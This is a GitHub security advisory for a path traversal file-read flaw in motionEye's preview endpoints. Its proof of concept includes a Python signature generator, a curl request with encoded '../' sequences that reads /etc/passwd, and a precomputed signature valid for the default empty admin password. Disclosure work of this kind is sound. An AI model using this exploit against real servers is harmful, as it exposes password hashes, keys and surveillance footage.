# [M] motionEye has an Arbitrary File Read via Path Traversal in Picture/Movie Preview Endpoint

## Summary
Severity: Medium
Advisory: GHSA-g9fx-5r4h-pcw3
CVE: CVE-2026-31978
CWE: CWE-22, CWE-284
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-g9fx-5r4h-pcw3
Type: github-advisory

## Affected
- PyPI: `motioneye` — affected >=0 <0.44.0

## Details
### Summary

motionEye v0.43.1 (latest stable) is vulnerable to path traversal in the picture and movie API endpoints, like `/picture/{id}/preview/{filename}`. Neither the API handlers, nor the `mediafiles.py` functions like `get_media_preview()` check for `..` sequences in the filename parameter, except `get_media_content()` which does. This allows an authenticated user with normal (non-admin) privileges to read arbitrary files from the filesystem as the motionEye process user.

### Details

The `get_media_content()` function properly validates the path:

```python
# mediafiles.py ~line 506 — SAFE
def get_media_content(camera_config, path, media_type):
    target_dir = camera_config['target_dir']
    full_path = os.path.join(target_dir, path)

    if '..' in path:        # <-- PATH TRAVERSAL CHECK PRESENT
        return None
    ...
```

But `get_media_preview()` does NOT:

```python
# mediafiles.py ~line 910 — VULNERABLE
def get_media_preview(camera_config, path, media_type, ...):
    target_dir = camera_config['target_dir']
    full_path = os.path.join(target_dir, path)
    # <-- NO '..' CHECK
    ...
```

Similarly, `del_media_content()` at line ~865 is also missing the check. This is a classic inconsistent fix pattern.

The exploit requires `%2F`-encoded slashes (`..%2F..%2F`) which Tornado's URL router does NOT normalize — it passes the raw `../` through to `os.path.join()`.

### PoC

**Step 1:** Authenticate as any user (normal or admin).

**Step 2:** Compute the request signature. motionEye uses HMAC-style signatures for API authentication. The signature is `SHA1("GET:<path>?_username=<user>::<password>")`. With the default empty admin password:

```python
#!/usr/bin/env python3
"""Signature generator for motionEye path traversal PoC"""
import hashlib, re, urllib.parse

_SIGNATURE_REGEX = re.compile(r'[^A-Za-z0-9/?_.=&{}\[\]\":, -]', re.DOTALL)

def compute_signature(method, path, key=''):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&'.join([(q[0] + '=' + q[1]) for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = _SIGNATURE_REGEX.sub('-', path)
    key = _SIGNATURE_REGEX.sub('-', key)
    return hashlib.sha1(('{}:{}:{}:{}'.format(method, path, '', key)).encode('utf-8')).hexdigest().lower()

path = '/picture/1/preview/..%2F..%2F..%2F..%2Fetc%2Fpasswd?_username=admin'
sig = compute_signature('GET', path)
print(f'Signature: {sig}')
print(f'curl --path-as-is -s "http://TARGET:8765/{path}&_signature={sig}"')
```

**Step 3:** Send the request using `curl --path-as-is` (the `--path-as-is` flag is **required** — without it, curl normalizes `..%2F` and collapses the traversal before sending):

```bash
# With default empty admin password, the signature is static:
curl --path-as-is -s "http://localhost:8766/picture/1/preview/..%2F..%2F..%2F..%2Fetc%2Fpasswd?_username=admin&_signature=8b387100a519c617bdd66fe629d14b05e09c6e0c"
```

**Step 4:** The server returns the contents of `/etc/passwd`.

**Verified output:**

<img width="1743" height="410" alt="etc_passwd" src="https://github.com/user-attachments/assets/30ec85f7-4fe7-4d3b-ae23-1d02c3ecad64" />

> **Note on the signature value:** The signature `8b387100a519c617bdd66fe629d14b05e09c6e0c` is valid for the default empty admin password. If the admin password has been changed, regenerate the signature using the Python script above with the correct password passed as the `key` parameter.

### Impact

An authenticated user (normal or admin) can read arbitrary files from the server, including:

- `/etc/passwd` — user enumeration
- `/etc/motioneye/motion.conf` — admin password hash, surveillance password in plaintext
- `/etc/shadow` — password hashes (if running as root, which is default in Docker)
- SSH keys, environment variables, and other sensitive configuration files
- Surveillance footage from other cameras

## References
- https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g9fx-5r4h-pcw3
- https://github.com/motioneye-project/motioneye
